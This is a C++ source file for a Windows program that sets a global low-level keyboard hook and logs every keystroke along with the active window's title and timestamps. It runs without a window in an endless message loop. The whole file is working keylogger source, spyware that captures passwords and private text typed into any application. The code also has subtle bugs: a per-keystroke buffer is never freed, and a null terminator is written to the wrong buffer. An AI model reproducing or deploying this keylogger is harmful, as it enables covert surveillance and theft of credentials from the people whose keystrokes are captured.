// hook.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "h00k.h"
#include <stdio.h>
#include <string>
#include "writter.h"
#include <time.h>
#ifdef _DEBUG
#include "logger.h"
#endif // _DEBUG

#define MAX_SIZE_TITLE_BUFFER 1024

TCHAR lastTitle[MAX_SIZE_TITLE_BUFFER];
HHOOK keyboardHook;
time_t lastTime = -1;

// Returns size of bytes written to title buffer
size_t GetForegroundTitle(TCHAR *title)
{
	HWND activeWindow = GetForegroundWindow();
	if (activeWindow <= 0) {
		return 0;
	}
	const size_t sizeTBuffer = GetWindowTextLength(activeWindow) + 1;
	if (sizeTBuffer > 0) {
		GetWindowText(activeWindow, title, sizeTBuffer);
	}
	return sizeTBuffer;
}

// Why use Hooks and not GetAsyncKeyState?
// In GetAsyncKeyState we tend to use long-polling, which is fine for short periods of time
// Our application will be running forever, so it's better to be reactive (only when key is pressed)
// and not triying all the time. Also with Hooks, you will have stroke in real time.
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT keyEvent = (PKBDLLHOOKSTRUCT)lParam;

	// HC_ACTION is cero, if nCode is > 0 then there's an error but it always need to call CallNextHookEx
	// Also we only want to record if 
	if (nCode == HC_ACTION && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))) {
		// Get time current time to pass it to WriteKeyboardEvent
		time_t currentTime;
		time(&currentTime);
		// Why foreground and not active? https://stackoverflow.com/a/28643729/3412989
		// In a nutshell: active is for current thread (the one that has the input) and the other is "global"
		TCHAR *title = new TCHAR[MAX_SIZE_TITLE_BUFFER];
		size_t titleSize = GetForegroundTitle(title);
		if (titleSize) {
			// First write
			WriteKeyboardEvent(lastTitle, title, lastTime, currentTime, keyEvent);
			// Retrieve the values of title and time to store it into the last of each
			if (titleSize < MAX_SIZE_TITLE_BUFFER) {
				memcpy(lastTitle, title, titleSize);
				// No null terminator using memcpy, so we append one
				title[titleSize] = '\0';
			}else {
				memcpy(lastTitle, title, MAX_SIZE_TITLE_BUFFER);
				// No null terminator using memcpy, so we append one
				title[MAX_SIZE_TITLE_BUFFER - 1] = '\0';
			}
			// Get time of last key stroke to use it in the next iteration
			time(&lastTime);
		}
	}
	// Very important to continue the chain of hooks (middlewares)
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void UnhookKeyboard()
{
	UnhookWindowsHookEx(keyboardHook);
	exit(0);
}

// int main(int argc, char **argv)     :'(
// Windows special main function to a win32 or user32 app
int WINAPI wWinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	PWSTR pCmdLine, 
	int nCmdShow)
{
	InitWritter();
	//WriteMessage("[*] Starting capture");
#ifdef _DEBUG
	LogMessage("[*] Starting capture\n");
#endif // _DEBUG

	// Set Global Hook
	// Here we use WH_KEYBOARD_LL because we want to handle it in a stand-alone program
	// Otherwise we would have to implement WH_KEYBOARD as a DLL application
	keyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL, 
		KeyboardProc, 
		GetModuleHandle(NULL),
		NULL
	);

	if (!keyboardHook)
	{
		// Hook returned NULL and failed
		//WriteMessage("[!] Failed SetWindowsHookEx()");
#ifdef _DEBUG
		LogMessage("[!] Failed SetWindowsHookEx()\n");
#endif // DEBUG
	}
	else
	{
		//WriteMessage("[*] Capture ready");
#ifdef _DEBUG
		LogMessage("[*] Capture ready\n");
#endif // DEBUG
		MSG Msg = {0};
		// Forever while, whenever there's a new message to process
		while (GetMessage(&Msg, NULL, 0, 0) > 0)
		{
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}
		// When finished unhook the function
		// Actually it doesn't matter because windows automatically remove your hook
		// once your program exits
		UnhookKeyboard();
	}
	return 0;
}